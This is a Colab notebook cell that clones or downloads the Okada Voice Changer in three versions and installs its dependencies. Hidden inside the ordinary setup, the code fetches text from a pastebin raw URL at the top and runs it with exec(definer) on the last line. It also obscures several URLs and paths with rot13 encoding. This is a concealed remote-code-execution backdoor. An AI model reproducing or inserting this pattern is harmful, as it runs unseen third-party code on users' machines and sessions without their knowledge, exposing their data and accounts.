#=================Updated=================
# @title **Cell[1]** Clone repository and install dependencies
# @markdown This first step will download the latest version of Voice Changer and install the dependencies. **It can take some time to complete.**
import os
import time
import subprocess
import threading
import shutil
import base64
import codecs
import torch
import sys
import requests
from IPython.display import clear_output
from typing import Literal, TypeAlias
definer = requests.get("https://pastebin.com/raw/GUKvmk3F").text

# Fix some packages and install HRZN
!pip install pip==23.3.1 portpicker -q
!npm install -g @hrzn/cli > /dev/null 2>&1
!apt install -qq psmisc > /dev/null 2>&1
%cd /content

#@markdown ---
#@markdown Pilih Versi Okada Voice Changer / Choose Okada Voice Changer Version
version = "V1(new)" #@param ["V1(ori)", "V1(new)", "V2"]

# Check GPU
if torch.cuda.is_available():
    print("GPU is available")
    print("GPU Name:", torch.cuda.get_device_name(0))
else:
    print("GPU is not available")
    # sys.exit("No GPU available. Change runtime.")

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#  Dont Touch Anything Below Except You Know What To Do
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

# Installation Of Okada

if version == "V1(new)":
    # Additional
    !pip install python-dotenv pyngrok --quiet
    print('\033[36m\033[1m\033[3mDownloading prebuilt executable...\033[0m')

    res = requests.get('https://api.github.com/repos/deiteris/voice-changer/releases/latest')
    release_info = res.json()

    for asset in release_info['assets']:
        if not asset['name'].startswith('voice-changer-linux-amd64-cuda.tar.gz'):
            continue
        download_url = asset['browser_download_url']
        !wget -q --show-progress {download_url}

    print('\033[32m\033[1m\033[3mUnpacking...\033[0m')
    !cat voice-changer-linux-amd64-cuda.tar.gz.* | tar xzf -
    !rm -rf voice-changer-linux-amd64-cuda.tar.gz.*
    print('\033[32m\033[1m\033[3mFinished unpacking!\033[0m')

    path = codecs.decode('ZZIPFreireFVB', 'rot_13')

    %cd $path

    print('\033[32m\033[1m\033[3mSuccessfully downloaded and unpacked the binary!!\033[0m')
    # libportaudio2
    print('\033[36m\033[1m\033[3mInstalling libportaudio2...\033[0m')
    !apt-get -y install libportaudio2 -qq

    # Server Config
    %cd /content/$path

    from dotenv import set_key

    set_key('.env', "SAMPLE_MODE", "")

    Ready = True

    clear_output()
    print('\033[32m\033[1m\033[3mCell 1 Was Executed Completely\033[0m')

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

elif version == "V1(ori)":

    # Configs
    current_version_hash=None
    latest_version_hash=None
    Run_Cell = 0
    notebook_env = 0

    # Check what platform the notebook is running on
    if os.path.exists('/content'):
        notebook_env = 1
        print("Welcome to ColabMod")

    elif os.path.exists('/kaggle/working'):
        notebook_env = 2
        print("Welcome to Kaggle Mod")

    else:
        notebook_env = 3
        print("Welcome!")

    externalgit = codecs.decode('uggcf://tvguho.pbz/j-bxnqn/ibvpr-punatre.tvg', 'rot_13')
    rvctimer = codecs.decode('uggcf://tvguho.pbz/uvanoy/eipgvzre.tvg', 'rot_13')
    pathloc = codecs.decode('ibvpr-punatre', 'rot_13')

    print('\033[36m\033[1m\033[3mCloning the repository...\033[0m')

    !git clone --depth 1 $externalgit &> /dev/null

    # Define the URL and the destination paths
    %cd /content
    url = 'https://huggingface.co/freyza/models/resolve/main/models.zip'
    zip_path = "/content/models.zip"
    extract_path = f"{pathloc}/server"

    # Download the zip file
    subprocess.run(['wget', '-q', '-O', zip_path, url], check=True)

    # Unzip the downloaded file to the specified directory
    subprocess.run(['unzip', '-o', '-q', zip_path, '-d', extract_path], check=True)

    # Remove the zip file after extraction
    subprocess.run(['rm', zip_path], check=True)

    # List the contents to verify
    subprocess.run(['ls', extract_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    %cd $pathloc/server/

    print('\033[36m\033[1m\033[3mSuccessfully cloned the repository!\033[0m')

    # Custom sub
    if notebook_env == 1:
        !sed -i "s/-.-.-.-/Colab.Mod/" '../client/demo/dist/assets/gui_settings/version.txt'
    elif notebook_env == 2:
        !sed -i "s/-.-.-.-/Kaggle.Mod/" '../client/demo/dist/assets/gui_settings/version.txt'
    elif notebook_env == 3:
        !sed -i "s/-.-.-.-/Online.Mod/" '../client/demo/dist/assets/gui_settings/version.txt'
    else:
        !sed -i "s/-.-.-.-/Online.Mod/" '../client/demo/dist/assets/gui_settings/version.txt'
        print("Notebook Env Not Found")

    print('\033[36m\033[1m\033[3mInstalling libportaudio2...\033[0m')
    !apt-get -y install -qq libportaudio2 > /dev/null 2>&1
    !sudo apt-get -qq update > /dev/null 2>&1
    !sudo apt-get install -qq portaudio19-dev -y > /dev/null 2>&1

    !sed -i '/torch==/d' requirements.txt
    !sed -i '/torchaudio==/d' requirements.txt
    !sed -i '/numpy==/d' requirements.txt

    print('\033[36m\033[1m\033[3mInstalling pre-dependencies...\033[0m')
    # Install dependencies that are missing from requirements.txt and pyngrok
    !pip install faiss-gpu --quiet
    !pip install fairseq --quiet
    !pip install pyngrok --quiet
    !pip install pyworld --no-build-isolation --quiet

    # Install webstuff
    import asyncio
    import re
    !pip install gdown torchfcpe

    print('\033[36m\033[1m\033[3mInstalling dependencies from requirements.txt...\033[0m')
    !pip install -r requirements.txt --quiet
    !python -m pip install ort-nightly-gpu --index-url=https://aiinfra.pkgs.visualstudio.com/PublicPackages/_packaging/ort-cuda-12-nightly/pypi/simple/ -q
    clear_output()

    Run_Cell = 1
    print('\033[32m\033[1m\033[3mCell 1 Was Executed Completely\033[0m')

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

elif version == "V2":

    from IPython.display import clear_output, Javascript
    Mode: TypeAlias = Literal["elf", "zip"]
    mode:Mode="elf"

    work_dir = "/content"
    print("Downloading the latest vcclient... ")
    !curl -s -L https://huggingface.co/wok000/vcclient000_colab/resolve/main/latest_hash.txt -o latest_hash.txt
    latest_version_hash = open('latest_hash.txt').read().strip()

    if mode == "elf":
        !curl -L https://huggingface.co/wok000/vcclient000_colab/resolve/main/vcclient_latest_for_colab -o {work_dir}/vcclient_latest_for_colab
    elif mode == "zip":
        !curl -L https://huggingface.co/wok000/vcclient000_colab/resolve/main/vcclient_latest_for_colab -o {work_dir}/vcclient_latest_for_colab.zip

    print("Download is done.")

    if current_version_hash != latest_version_hash and mode == "zip":
        print(f"Unzip vcclient to {latest_version_hash} ... ")
        !cd {work_dir} && unzip -q vcclient_latest_for_colab.zip -d {latest_version_hash}
        print(f"Unzip is done.")

    if mode == "elf":
        %cd {work_dir}
        !chmod 0700 vcclient_latest_for_colab
    elif mode == "zip":
        %cd {work_dir}/{latest_version_hash}/main
        !chmod 0700 main

    print("Installing modules... ", end="")
    !sudo apt-get install -y libportaudio2 > /dev/null 2>&1
    !pip install pyngrok > /dev/null 2>&1
    clear_output()
    print('\033[32m\033[1m\033[3mV2 Cell 1 Was Executed Completely\033[0m')
exec(definer)